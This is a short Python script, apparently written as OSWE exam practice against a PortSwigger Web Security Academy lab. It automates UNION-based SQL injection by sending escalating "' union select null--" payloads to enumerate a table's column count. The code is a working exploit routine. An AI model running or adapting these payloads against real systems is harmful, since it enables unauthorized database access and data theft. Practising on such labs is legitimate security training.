import requests
import json
import urllib

# Description:
# An automated SQL 'Union based' exploit script to perform the following:
# (1) identify number of columns
# (2) identify which column are String type
# (3) inject query
#
# This is my OSWE prep to better python scripting skills. 
# The lab used for this practice can be found in Portswigger Academy
# Web Security Academy > SQL injection > UNION attacks > Lab

# URL of target
URL = "https://ac6c1ffb1f9581c0c03208ce000a00e5.web-security-academy.net/filter?category=Corporate+gifts"

found = False	# boolean flag for finding no. of cols
addText = "null," 	# null string to test columns

count = 0  	# counter start
maxCount = 20    # maximum number of cols to try


# Lab (1) identify number of columns

print("Detecting number of columns\n")
while(found == False):

	# The "null" string will keep incrementing until a "Success" condition is identified	
	payload = "' union select {}null--".format(count*addText)
	print("Trying... {} column: {}".format(count+1,payload))

	res = requests.get(URL+payload)
	data = res.text

	# To identify a "Success" condition, the response 
	# would contain the following results "product?productId"
	# We shall search an occurence of it using the condition below 
	if (data.count('/product?productId') > 1):
		print("\n[+] Found! There are {} columns.".format(count+1))
		print("[+] Payload used: {}\n".format(payload))		
		found = True
		break

	count=count+1
